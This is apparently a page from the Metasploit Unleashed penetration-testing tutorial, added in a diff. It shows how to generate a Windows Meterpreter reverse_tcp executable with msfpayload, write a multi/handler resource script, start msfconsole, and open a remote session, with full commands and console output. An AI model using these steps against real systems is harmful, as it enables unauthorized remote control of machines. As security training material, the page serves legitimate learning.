@@ -1,0 +1,93 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Writing Meterpreter Scripts</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Writing
+Meterpreter Scripts</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">There are a few things you need to keep
+in mind when creating a new meterpreter script.
+</p>
+<dl style="color: rgb(0, 0, 0);">
+  <dd>
+    <ul>
+      <li>Not all versions of Windows are the same
+      </li>
+      <li>Some versions of Windows have security countermeasures for
+some of the commands
+      </li>
+      <li>Not all command line tools are in all versions of Windows.
+      </li>
+      <li>Some of the command line tools switches vary depending on the
+version of Windows
+      </li>
+    </ul>
+  </dd>
+</dl>
+<p style="color: rgb(0, 0, 0);"><br>
+In short, the same constraints that you have when working with standard
+exploitation methods. MSF can be of great help, but it can&#8217;t change the
+fundamentals of that target. Keeping this in mind can save a lot of
+frustration down the road. So keep your target&#8217;s Windows version and
+service pack in mind, and build to it.
+</p>
+<p style="color: rgb(0, 0, 0);">For our purposes, we are going to
+create a stand alone binary
+that will be run on the target system that will create a reverse
+Meterpreter shell back to us. This will rule out any problems with an
+exploit as we work through our script development.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">root@bt4:~# cd /pentest/exploits/framework3/<br>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.184 X &gt; Meterpreter.exe<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: windows/meterpreter/reverse_tcp<br>Length: 310<br>Options: LHOST=192.168.1.184</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Wonderful. Now, we move the
+executable to our Windows machine that
+will be our target for the script we are going to write. We just have
+to set up our listener. To do this, lets create a short script to start
+up multi-handler for us.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# touch meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo use exploit/multi/handler &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set LHOST 192.168.1.184 &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set ExitOnSession false &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo exploit -j -z &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# cat meterpreter.rc<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.184<br>set ExitOnSession false<br>exploit -j -z</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Here we are using the exploit multi
+handler to receive our payload,
+we specify that the payload is a Meterpreter reverse_tcp payload, we
+set the payload option, we make sure that the multi handler will not
+exit once it receives a session since we might need to re-establish one
+due to an error or we might be testing under different versions of
+Windows from different target hosts.
+</span>
+<p style="color: rgb(0, 0, 0);"><br>
+While working on the scripts, we will save the test scripts to
+/pentest/exploits/framework3/scripts/meterpreter so that they can be
+run.
+</p>
+<p style="color: rgb(0, 0, 0);"><br>
+Now, all that remains is to start up msfconsole with our our resource
+script.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfconsole -r meterpreter.rc<br><br><br>=[ metasploit v3.3-rc1 [core:3.3 api:1.0]<br>+ -- --=[ 384 exploits - 231 payloads<br>+ -- --=[ 20 encoders - 7 nops<br>=[ 161 aux<br><br>resource&gt; use exploit/multi/handler<br>resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource&gt; set LHOST 192.168.1.184<br>LHOST =&gt; 192.168.1.184<br>resource&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource&gt; exploit -j -z<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">As can be seen above, Metasploit is
+listening for a connection. We
+can now execute our executable in our Windows host and we will receive
+a session. Once the session is established, we use the sessions command
+with the '&#8211;i' switch and the number of the session to interact with it:
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (192.168.1.158:4444 -&gt; 192.168.1.104:1043)<br><br>msf exploit(handler) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Scripting"
+ title="Meterpreter Scripting">Meterpreter Scripting</a></div>
+</body>
+</html>
